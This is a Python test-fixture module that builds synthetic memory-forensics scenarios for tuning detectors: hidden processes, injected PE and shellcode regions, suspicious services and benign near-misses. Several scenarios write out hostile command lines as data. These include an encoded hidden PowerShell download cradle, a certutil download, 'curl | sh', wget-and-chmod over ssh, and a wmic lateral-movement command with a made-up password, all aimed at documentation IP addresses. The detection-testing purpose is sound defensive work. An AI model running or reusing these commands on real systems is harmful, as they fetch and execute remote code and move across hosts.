# ruff: noqa: E501 - hand-written synthetic records, one per line
"""The labelled scenario set (M8 phase 3): every scenario is one benign baseline
(`dataset.baselines`) plus at most a few injected records, built at test time and never
committed as output. `labels.json` (committed, hand-written, frozen before the detectors were
tuned) holds the expected findings and IOCs of each scenario.

    build("win_injected_pe") -> MemoryView
    SCENARIOS                 -> name -> (baseline, mutation)

Synthetic data only (requirement §16): no memory image, no real host, documentation
addresses for external peers, made-up secrets (listed in `SECRETS` so the quality test can
prove none reaches a shared surface unmasked).
"""

from collections.abc import Callable

from cyberlab_jobs.memory import MemoryLimits

from dataset.baselines import (
    BASELINES,
    DEFENDER,
    LINUX_SECRETS,
    PS,
    WIN,
    Draft,
    bash,
    ldr,
    region,
    service,
    tcp,
)
from memory_worker.view import MemoryView

Mutation = Callable[[Draft], None]

# The first 64 bytes of a DOS header (e_lfanew 0x80 at offset 0x3c, beyond the captured
# head) and an x64 shellcode prologue (no header).
MZ_HEAD = (
    bytes.fromhex("4d5a90000300000004000000ffff0000b800000000000000400000")
    + bytes(33)
    + (0x80).to_bytes(4, "little")
).hex()
SHELLCODE_HEAD = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220"

EXPLORER = 3040
NOTEPAD = 5300
WINWORD = 4800
SERVICES = 676
SERVER_WININIT = 488
WINLOGON = 640
LSASS = 696
BASH = 1030
ENCODED = "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGEAJwApAA=="


def _hidden_process(d: Draft) -> None:
    d.add_process(
        7340,
        EXPLORER,
        "updater.exe",
        "C:\\Users\\alice\\AppData\\Roaming\\updater.exe",
        70,
        sources=("psscan",),
        threads=6,
    )


def _injected_pe(d: Draft) -> None:
    d.injections.append(
        region(
            EXPLORER,
            "explorer.exe",
            0x0000_0000_0520_0000,
            0x1D000,
            "PAGE_EXECUTE_READWRITE",
            MZ_HEAD,
            has_pe=True,
        )
    )


def _injected_shellcode(d: Draft) -> None:
    d.injections.append(
        region(
            NOTEPAD,
            "notepad.exe",
            0x0000_01F4_5A30_0000,
            0x1000,
            "PAGE_EXECUTE_READWRITE",
            SHELLCODE_HEAD,
        )
    )


def _lsass_wrong_parent(d: Draft) -> None:
    d.proc(LSASS)["ppid"] = WINLOGON  # started by winlogon.exe instead of wininit.exe


def _two_lsass(d: Draft) -> None:
    d.add_process(7712, SERVER_WININIT, "lsass.exe", WIN + "lsass.exe", 72)


def _scvhost(d: Draft) -> None:
    d.add_process(
        7020,
        SERVICES,
        "scvhost.exe",
        "C:\\Windows\\scvhost.exe",
        66,
        cmdline="C:\\Windows\\scvhost.exe -k netsvcs",
    )


def _core_name_public(d: Draft) -> None:
    d.add_process(
        7140,
        SERVICES,
        "svchost.exe",
        "C:\\Users\\Public\\svchost.exe",
        67,
        cmdline="C:\\Users\\Public\\svchost.exe -k LocalService",
    )


def _encoded_powershell(d: Draft) -> None:
    d.add_process(
        7400,
        WINWORD,
        "powershell.exe",
        PS,
        74,
        cmdline=f"powershell.exe -nop -w hidden -enc {ENCODED}",
    )


def _certutil_download(d: Draft) -> None:
    d.add_process(
        7460,
        5100,
        "certutil.exe",
        WIN + "certutil.exe",
        75,
        cmdline="certutil.exe -urlcache -split -f http://198.51.100.12/p.exe C:\\Users\\Public\\p.exe",
    )


def _unlinked_dll(d: Draft) -> None:
    d.artifacts.append(
        ldr(
            EXPLORER,
            "C:\\Users\\alice\\AppData\\Local\\Temp\\msupd.dll",
            0x0000_0000_6A40_0000,
            False,
            False,
            False,
        )
    )


def _service_programdata(d: Draft) -> None:
    d.artifacts.append(
        service("UpdaterSvc", "C:\\ProgramData\\Updater\\upd.exe", state="SERVICE_RUNNING")
    )


def _lsass_external(d: Draft) -> None:
    d.connections.append(
        tcp(LSASS, "lsass.exe", "10.0.0.15", 50433, "203.0.113.80", 443, minute=76)
    )


def _cmdline_password(d: Draft) -> None:
    d.add_process(
        7520,
        EXPLORER,
        "cmd.exe",
        WIN + "cmd.exe",
        77,
        cmdline='cmd.exe /c net use \\\\10.0.0.9\\c$ /user:CORP\\admin Winter2026!Pw && wmic /node:10.0.0.9 /user:CORP\\admin /password:Winter2026!Pw process call create "C:\\Windows\\Temp\\run.bat"',
    )


def _combined(d: Draft) -> None:
    d.add_process(
        7600,
        EXPLORER,
        "svhost.exe",
        "C:\\Users\\Public\\svhost.exe",
        78,
        sources=("psscan",),
        threads=4,
    )
    d.injections.append(
        region(
            7600,
            "svhost.exe",
            0x0000_0000_0040_0000,
            0x16000,
            "PAGE_EXECUTE_READWRITE",
            MZ_HEAD,
            has_pe=True,
        )
    )


def _curl_sh(d: Draft) -> None:
    d.artifacts.append(bash(BASH, "curl -fsSL http://198.51.100.7/x.sh | sh", 95))


def _bash_password(d: Draft) -> None:
    d.artifacts.append(
        bash(
            BASH,
            "sshpass -p 'Tr0ub4dor&3' ssh root@10.0.0.31 \"wget http://198.51.100.9/a -O /tmp/a && chmod +x /tmp/a\"",
            96,
        )
    )


def _defender_platform(d: Draft) -> None:
    platform = DEFENDER.replace("4.18.24090.11-0", "4.18.24080.9-0")
    d.add_process(
        7800,
        SERVICES,
        "MsSense.exe",
        "C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection\\Platform\\10.8760.19045.1001\\MsSense.exe",
        80,
    )
    d.artifacts += [
        service("WinDefend", f'"{platform}MsMpEng.exe"', state="SERVICE_STOPPED"),
        service(
            "Sense",
            '"C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection\\Platform\\10.8760.19045.1001\\MsSense.exe"',
            pid=7800,
        ),
        service("WdNisSvc", f"{platform}NisSrv.exe", state="SERVICE_STOPPED"),
    ]


def _exited_parent(d: Draft) -> None:
    # A second session: its smss.exe exited (still found by the pool scan, exit time set) after
    # starting csrss.exe and wininit.exe ...
    d.add_process(
        7900,
        356,
        "smss.exe",
        "\\SystemRoot\\System32\\smss.exe",
        81,
        sources=("psscan",),
        exit_minute=81,
    )
    d.add_process(7904, 7900, "csrss.exe", WIN + "csrss.exe", 81)
    d.add_process(7908, 7900, "winlogon.exe", WIN + "winlogon.exe", 81)
    # ... and a third session whose smss.exe pid now belongs to a later, unrelated process
    # (pid reuse: the real parent is gone).
    d.add_process(7912, 7916, "csrss.exe", WIN + "csrss.exe", 82)
    d.add_process(7916, 3040, "notepad.exe", WIN + "notepad.exe", 83)


def _nothing(d: Draft) -> None:
    del d


SCENARIOS: dict[str, tuple[str, Mutation]] = {
    # Benign baselines.
    "windows_workstation": ("windows_workstation", _nothing),
    "windows_server": ("windows_server", _nothing),
    "linux_server": ("linux_server", _nothing),
    # Positives.
    "win_hidden_process": ("windows_workstation", _hidden_process),
    "win_injected_pe": ("windows_workstation", _injected_pe),
    "win_injected_shellcode": ("windows_workstation", _injected_shellcode),
    "win_lsass_wrong_parent": ("windows_workstation", _lsass_wrong_parent),
    "win_two_lsass": ("windows_server", _two_lsass),
    "win_scvhost": ("windows_workstation", _scvhost),
    "win_core_name_public": ("windows_workstation", _core_name_public),
    "win_encoded_powershell": ("windows_workstation", _encoded_powershell),
    "win_certutil_download": ("windows_workstation", _certutil_download),
    "win_unlinked_dll": ("windows_workstation", _unlinked_dll),
    "win_service_programdata": ("windows_server", _service_programdata),
    "win_lsass_external": ("windows_workstation", _lsass_external),
    "win_cmdline_password": ("windows_workstation", _cmdline_password),
    "win_combined_indicators": ("windows_workstation", _combined),
    "linux_curl_sh": ("linux_server", _curl_sh),
    "linux_bash_password": ("linux_server", _bash_password),
    # Benign near-misses.
    "win_defender_platform": ("windows_workstation", _defender_platform),
    "win_exited_parent": ("windows_workstation", _exited_parent),
}
# Made-up secrets in the scenario command lines and history: never in a finding, an IOC or a
# timeline title unmasked.
SECRETS: dict[str, list[str]] = {
    "linux_server": LINUX_SECRETS,
    "linux_curl_sh": LINUX_SECRETS,
    "linux_bash_password": [*LINUX_SECRETS, "Tr0ub4dor&3"],
    "win_cmdline_password": ["Winter2026!Pw"],
}
LIMITS = MemoryLimits(
    max_bytes=16 * 1024**3,
    timeout_s=5400,
    identify_timeout_s=600,
    tool_timeout_s=1200,
    max_processes=20_000,
    max_connections=50_000,
    max_injections=5_000,
    max_artifacts=50_000,
    max_findings=5_000,
    max_iocs=20_000,
    max_timeline=5_000,
    max_result_bytes=256 * 1024**2,
)


def draft(name: str) -> Draft:
    baseline, mutate = SCENARIOS[name]
    d = BASELINES[baseline]()
    mutate(d)
    return d


def build(name: str) -> MemoryView:
    return draft(name).view()
